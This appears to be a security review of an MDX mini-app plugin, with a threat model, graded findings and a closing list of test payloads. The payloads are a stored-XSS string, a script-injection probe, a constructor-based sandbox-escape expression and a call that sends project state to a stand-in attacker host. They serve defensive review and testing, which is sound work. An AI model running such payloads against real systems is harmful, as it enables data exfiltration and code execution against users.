# Security Review — MDX Mini-App Plugin

Reviewer pass over phases 3 + 4 code. Findings grouped by severity.

## Threat model (short)

| Actor | Capabilities | Risk we care about |
|---|---|---|
| Workspace owner (authors MDX) | Creates/edits MDX notes; can author `useQuery`/`useMutation` to any URL. | Malicious-or-compromised owner exfiltrates state/cookies. |
| Project member (read access) | Executes MDX; writes per-project state via `useProjectState`. | State poisoning that later executes on other members. |
| Non-owner, non-member | Can fetch publicly-shared project data if a project is public. | Probing / enumeration. |
| External site | Cannot run MDX directly; may try to CSRF the Archon backend. | Cross-site state writes. |
| Evil import bundle | User opens a bundle authored elsewhere. | Import-time takeover. |

## Findings

### High

None identified. The surfaces most likely to be High (`fetch` credentials, MDX imports, state poisoning in Markdown) are already mitigated inline — see Medium/Low for the specifics.

### Medium

- **M-1. `<Markdown>` sanitizer is a placeholder.**
  `packages/archon-mdx-sdk/src/components.tsx` ships a minimal `Markdown` that splits on blank lines. State poisoning via `<Markdown>` requires a sanitizing renderer (rehype-sanitize + DOMPurify) before GA; otherwise a malicious project member could write `state.tasks = [{ title: "<img src=x onerror=steal()>" }]` and affect other members when a `<List>` uses that title.
  **Fix:** replace the component body with `react-markdown` + `rehype-sanitize` (both already in deps) before shipping; keep allow-list minimal. Add a payload-stripping unit test.

- **M-2. Expression-sandbox rewriter is regex-based.**
  `apps/archon-web/lib/mdx/sandbox.ts`'s `rewriteEsmToCjs` uses regexes to detect `import` statements. MDX v3 may emit import statements in shapes this regex doesn't fully match (string escapes, unusual whitespace). An attacker-authored MDX file could theoretically hide an import behind a string the regex ignores.
  **Fix:** parse the compiled module with a real JS parser (e.g. `@babel/standalone` or a lightweight swc) and walk it to verify only `@archon/mdx-sdk` / `react/jsx-runtime` imports appear. Add a fuzz test with 200+ `import`-shaped strings.

- **M-3. In-memory rate limit does not survive horizontal scaling.**
  `rate-limit.ts`'s `buckets` Map lives in the process. Running multiple sync-api instances behind a load balancer multiplies the effective budget by the instance count. Not a security hole per se, but effectively turns the 50-burst cap into `50 × N`.
  **Fix:** back the bucket state with Mongo (collection `mdx_state_rate_buckets`) for v1.1, or a Redis counter.

### Low

- **L-1. `requireProjectMember` uses write-access as the gate for reads.**
  `apps/archon-sync-api/src/mdx-state/routes.ts` treats "can write project" as the read gate for state. Consequence: read-only shared members can't read mini-app state either. Decision 4 says "anyone with project access"; this is a narrower reading.
  **Fix:** add a `userCanReadProject` companion in `permission-resolver.ts` and use it on GETs; keep `userCanWriteProject` on PUTs.

- **L-2. WS re-verify interval is 10s.**
  `ws.ts` sets `REVERIFY_INTERVAL_MS = 10_000`. A revoked member still receives frames for ≤10s. Acceptable for v1, but document in the security-posture page.

- **L-3. Resume-token collection grows unbounded per connection.**
  `mdx_state_ws_cursors` has a 7-day TTL (`ensureMdxStateIndexes`). Connections that churn frequently (e.g., mobile reconnects) populate many docs, though TTL bounds them. Acceptable.

- **L-4. `useQuery` / `useMutation` don't redact `Authorization` headers on cross-origin.**
  If an author passes `headers: { Authorization: "Bearer <token>" }` to `useQuery({ url: "https://evil/" })`, the header is sent. Per R4-Qa authors intentionally have that power. But the default should never *add* credentials; it doesn't. Document the footgun in the cookbook.

- **L-5. `useNote` does not enforce same-project at the server.**
  Today `useNote` calls `GET /projects/:id/notes/resolve`; the route itself should (and likely does via existing perms) scope to that project. Confirm during wiring: add an integration test. Labelled Low because the existing note-resolve endpoint already has permission checks.

- **L-6. No CSP for compiled MDX output.**
  Compiled MDX executes in the main web app origin. A bug in the sandbox would expose full app privileges. Defense-in-depth recommendation: host the MDX renderer in a sandboxed `<iframe srcdoc="…" sandbox="allow-scripts">` that cannot share cookies with the parent origin.
  **Fix (v1.1):** move runtime to an iframe. For v1, rely on the sandbox correctness + Medium M-2 fix.

### Informational

- **I-1. Request bodies are not size-capped at Fastify.**
  A PUT of 300MB is rejected by the state service (413 from `MdxStateTooLargeError`), but only after the body is fully parsed in memory. Configure Fastify's `bodyLimit` for this route to e.g. 300MB so a malicious 1GB body is rejected at parse time.

- **I-2. `useProjectState` 409 handler is "server wins".**
  Legitimate last-writer loses their local edit. Acceptable v1 behavior, but surface in UI with a "rebased" toast so users don't silently lose work.

- **I-3. `mdx` note type is open-string.**
  Server `WpnNoteDoc.type` accepts any string. The web renderer only mounts `MdxRenderer` for `type === "mdx"`. Add a schema enum server-side when convenient.

## Test payloads (to run against a deployed instance)

1. `useMutation({ url: "https://attacker.example/leak", body: projectState })` — verify `credentials: "omit"` is set.
2. `<Markdown source="<script>alert(1)</script>" />` — verify nothing executes once M-1 is fixed.
3. `{(1).constructor.constructor("return this")()}` in a note — verify sandbox rejects (should reject today via the `import` regex; will be rigorous after M-2).
4. Two clients race on same state key — verify no lost updates (integration test, phase 4).
5. Revoke a project member's access mid-session — WS closes within 10s (L-2).
6. Import a bundle containing an MDX note — verify nothing executes before the user opens the note.

## Summary

No High findings block a v1 internal rollout. Ship with M-1 fixed; M-2 fixed before any external-tenant rollout. L-1 and I-1 should land alongside v1 for polish.
